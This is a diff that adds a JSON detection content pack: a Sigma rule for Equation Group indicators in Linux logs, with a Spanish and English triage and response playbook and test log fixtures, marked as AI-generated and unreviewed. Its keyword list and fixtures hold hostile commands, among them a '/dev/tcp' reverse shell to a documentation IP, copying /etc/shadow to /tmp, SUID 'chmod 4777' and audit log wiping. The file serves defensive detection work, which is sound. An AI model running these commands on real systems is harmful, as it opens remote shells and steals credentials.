@@ -1,0 +1,116 @@
+{
+  "rule": {
+    "id": "41e5c73d-9983-4b69-bd03-e13b67e9623c",
+    "title": "Equation Group Indicators",
+    "level": "high",
+    "status": "test",
+    "author": "Florian Roth (Nextron Systems)",
+    "path": "linux/builtin/lnx_apt_equationgroup_lnx.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/builtin/lnx_apt_equationgroup_lnx.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un log de Linux contiene una cadena de comando que coincide con scripts y herramientas atribuidas a Equation Group, filtradas por Shadow Brokers. Puede tratarse de una reverse shell, de escalamiento de privilegios con SUID, de robo de /etc/shadow o de borrado de auditoría.",
+      "what_it_detects": "Coincidencias literales de palabras clave en el mensaje del log, como 'chmod 4777', 'cp /etc/shadow /tmp/.', 'sh >/dev/tcp/* <&1 2>&1', listeners 'nc -vv -l -p', '/tmp/ratload', 'ewok -t ', 'xspy -display ' o el vaciado de /var/log/audit/audit.log.",
+      "why_it_matters": "Estos comandos corresponden a ejecución mediante la shell Unix (T1059.004): crean shells root con SUID, abren reverse shells, roban hashes de contraseñas y borran auditoría. Si son reales, el host probablemente está comprometido con privilegios elevados.",
+      "triage_steps": [
+        "Identifique qué palabra clave coincidió en el mensaje y anote el host, el usuario, el TTY, el PWD y el proceso que lo registró (sudo, bash, auditd).",
+        "Revise los eventos del mismo host en una ventana de +/- 15 minutos: inicios de sesión SSH, uso de sudo, descargas con wget o curl y procesos padre e hijo.",
+        "Si hay /dev/tcp, nc o telnet, extraiga la IP y el puerto de destino y búsquelos en los logs de firewall y proxy, y en las conexiones activas (ss -tnp).",
+        "Busque artefactos en el host: binarios SUID recientes (find / -perm -4000 -newer), /tmp/.scsi, /tmp/ratload, copias de shadow en /tmp o archivos crond y sendmail falsos.",
+        "Verifique la integridad de /var/log/audit/audit.log y compare su tamaño y marcas de tiempo con los de syslog para detectar huecos de auditoría.",
+        "Consulte alertas anteriores del mismo usuario, host e IP de origen, y confirme con el responsable si hay un pentest o ejercicio autorizado."
+      ],
+      "false_positives": [
+        "Pentests, ejercicios de red team o laboratorios de capacitación que reproducen herramientas filtradas de Shadow Brokers.",
+        "Scripts administrativos antiguos que usan 'chmod 700 sendmail', 'chmod 700 crond' o copian audit.log para respaldo.",
+        "Uso legítimo de nc o /dev/tcp para diagnóstico de red, o honeypots que registran comandos de atacantes."
+      ],
+      "response_steps": [
+        "Confirme la actividad con el dueño del sistema; si no está autorizada, trate el host como comprometido y escale a respuesta a incidentes.",
+        "Aísle el host de la red, preservando memoria, logs y los artefactos encontrados con sus hash antes de cualquier cambio.",
+        "Bloquee las IP de destino identificadas y deshabilite o rote las credenciales del usuario implicado y las contraseñas expuestas en /etc/shadow.",
+        "Elimine los binarios SUID y la persistencia identificados solo después de documentarlos; reconstruya el host desde una imagen confiable si se confirma acceso root."
+      ],
+      "severity_rationale": "El nivel high es adecuado porque los comandos indican control root, exfiltración de credenciales o borrado de evidencia, aunque algunas cadenas genéricas pueden aparecer en uso administrativo."
+    },
+    "en": {
+      "summary": "A Linux log line contains a command string from scripts and tools attributed to Equation Group and leaked by Shadow Brokers. It may be a reverse shell, SUID privilege escalation, /etc/shadow theft or audit log wiping.",
+      "what_it_detects": "Verbatim keyword matches in the log message, such as 'chmod 4777', 'cp /etc/shadow /tmp/.', 'sh >/dev/tcp/* <&1 2>&1', 'nc -vv -l -p' listeners, '/tmp/ratload', 'ewok -t ', 'xspy -display ' or truncation of /var/log/audit/audit.log.",
+      "why_it_matters": "These are Unix shell execution commands (T1059.004) that create SUID root shells, open reverse shells, steal password hashes and wipe audit logs. If genuine, the host is likely compromised with elevated privileges.",
+      "triage_steps": [
+        "Identify which keyword matched in the message and record the host, user, TTY, PWD and the process that logged it (sudo, bash, auditd).",
+        "Review events on the same host within +/- 15 minutes: SSH logins, sudo use, wget or curl downloads, and parent and child processes.",
+        "If /dev/tcp, nc or telnet appears, extract the destination IP and port and search firewall and proxy logs, plus live connections (ss -tnp).",
+        "Hunt for artifacts on the host: recent SUID binaries (find / -perm -4000 -newer), /tmp/.scsi, /tmp/ratload, shadow copies in /tmp, or fake crond and sendmail files.",
+        "Check /var/log/audit/audit.log integrity; compare its size and timestamps with syslog to spot audit gaps.",
+        "Look up earlier alerts for the same user, host and source IP, and confirm with the owner whether a pentest or authorized exercise is running."
+      ],
+      "false_positives": [
+        "Pentests, red team exercises or training labs replaying the leaked Shadow Brokers tools.",
+        "Old admin scripts using 'chmod 700 sendmail', 'chmod 700 crond' or copying audit.log for backup.",
+        "Legitimate nc or /dev/tcp use for network troubleshooting, or honeypots logging attacker commands."
+      ],
+      "response_steps": [
+        "Confirm the activity with the system owner; if unauthorized, treat the host as compromised and escalate to incident response.",
+        "Isolate the host from the network, preserving memory, logs and the artifacts found, with their hashes, before changing anything.",
+        "Block identified destination IPs, and disable or rotate the involved user's credentials and any passwords exposed via /etc/shadow.",
+        "Remove identified SUID binaries and persistence only after documenting them; rebuild from a trusted image if root access is confirmed."
+      ],
+      "severity_rationale": "High fits because the commands indicate root control, credential theft or evidence destruction, though a few generic strings can appear in admin work."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "sudo copies /etc/shadow into a hidden file in /tmp (abopscript keyword 'cp /etc/shadow /tmp/.')",
+        "event": {
+          "message": "Oct 25 14:03:12 bastion-01 sudo:   jperez : TTY=pts/0 ; PWD=/home/jperez ; USER=root ; COMMAND=/bin/cp /etc/shadow /tmp/.s",
+          "host": "bastion-01",
+          "program": "sudo",
+          "user": "jperez"
+        }
+      },
+      {
+        "description": "Shell history forwarded to syslog shows a /dev/tcp reverse shell to a documentation IP",
+        "event": {
+          "message": "Oct 25 14:05:40 web-03 bash[2211]: HISTORY: PID=2211 UID=0 sh >/dev/tcp/203.0.113.10/443 <&1 2>&1",
+          "host": "web-03",
+          "program": "bash",
+          "user": "root"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin backs up /etc/shadow to a root-only directory, not to a hidden file in /tmp",
+        "event": {
+          "message": "Oct 25 15:10:02 bastion-01 sudo:   mrojas : TTY=pts/1 ; PWD=/root ; USER=root ; COMMAND=/bin/cp /etc/shadow /root/backup/shadow.bak",
+          "host": "bastion-01",
+          "program": "sudo",
+          "user": "mrojas"
+        }
+      },
+      {
+        "description": "Netcat used for a port check, not as a listener with input redirection",
+        "event": {
+          "message": "Oct 25 15:12:44 web-03 bash[3310]: HISTORY: PID=3310 UID=1001 nc -vz 198.51.100.20 443",
+          "host": "web-03",
+          "program": "bash",
+          "user": "lgomez"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
